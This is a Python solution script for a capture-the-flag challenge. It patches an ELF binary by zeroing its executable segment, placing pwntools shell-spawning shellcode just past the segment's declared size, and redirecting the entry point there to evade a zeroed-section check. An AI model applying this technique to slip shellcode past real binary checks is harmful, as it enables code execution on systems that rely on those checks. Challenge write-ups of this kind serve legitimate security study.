#!/usr/bin/python3

# In this challenge, all the executable sections should be all zeroes

# My solution:
# I zero out the _text section, but put shellcode outside of the _text range
# and change the entrypoint to that shellcode
# It works because system set the whole page (0x1000) as executable, but only check with size

from elf import *
import os

def get_elf_base_address(elf_parser) -> int:
    """
    Generated by ChatGPT
    Calculates the base address of an ELF binary from an Elf object.
    
    Args:
        elf_parser: An Elf object generated by the parse function.
        
    Returns:
        The base address as an integer.
    """
    if elf_parser.header.e_type == constants.ET_EXEC:
        # For ET_EXEC, the base address is the lowest p_vaddr.
        # It's typically 0, but this handles cases with non-zero start addresses.
        lowest_vaddr = 0xffffffffffffffff
        for segment in elf_parser.segments:
            if segment.p_type == constants.PT_LOAD:
                if segment.p_vaddr < lowest_vaddr:
                    lowest_vaddr = segment.p_vaddr
        # If no PT_LOAD segment is found, fallback to 0.
        return lowest_vaddr if lowest_vaddr != 0xffffffffffffffff else 0

    elif elf_parser.header.e_type == constants.ET_DYN:
        # For ET_DYN, the base address is the lowest p_vaddr of a PT_LOAD segment.
        lowest_vaddr = 0xffffffffffffffff
        for segment in elf_parser.segments:
            if segment.p_type == constants.PT_LOAD:
                if segment.p_vaddr < lowest_vaddr:
                    lowest_vaddr = segment.p_vaddr
        # If no PT_LOAD segment is found, fallback to 0.
        return lowest_vaddr if lowest_vaddr != 0xffffffffffffffff else 0

    return 0  # Default fallback for other ELF types

os.system('echo "int main(){}" > main.c')
os.system('gcc main.c -no-pie -o main')

data = open('main', 'rb').read()
elf = parse(data)

if elf.header.e_type != constants.ET_EXEC: # just use -no-pie
    print("!!")
    exit(1)

from pwn import shellcraft, context, asm, disasm

context.arch = 'amd64'

sh = shellcraft.sh()
sh = asm(sh)

for i in range(len(elf.segments)):
    segment = elf.segments[i]
    if segment.p_flags & SegmentFlags.X:
        content = elf.ref[segment.p_offset:segment.p_offset + 0x1000]
        sz = segment.p_filesz
        print(f'sz: {sz}')
        elf.ref[segment.p_offset+sz:segment.p_offset + sz + len(sh)] = sh
        # elf.ref[segment.p_offset: segment.p_offset + sz] = [0] * sz
        for j in range(sz):
            elf.ref[segment.p_offset + j] = 0

        # print(hex(segment.p_offset))
        elf.header.e_entry = get_elf_base_address(elf) + segment.p_offset + sz

elf.write('main_patched')
